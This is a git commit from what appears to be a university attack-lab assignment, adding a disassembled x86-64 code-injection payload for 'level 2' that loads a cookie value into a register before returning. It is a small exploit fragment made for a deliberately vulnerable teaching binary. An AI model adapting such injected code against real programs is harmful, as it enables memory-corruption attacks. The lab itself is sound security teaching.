c485653db0fd2a334a39ac345815742f34f6fadf
FZhng <m42zhang@uwaterloo.ca>
2023-05-04 22:37:06 -0400

    finished level 2

---
+++ attack/l2.d
@@ -0,0 +1,11 @@
+
+l2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   7:	48 03 24 25 08 00 00 	add    0x8,%rsp
+   e:	00 
+   f:	c3                   	retq   
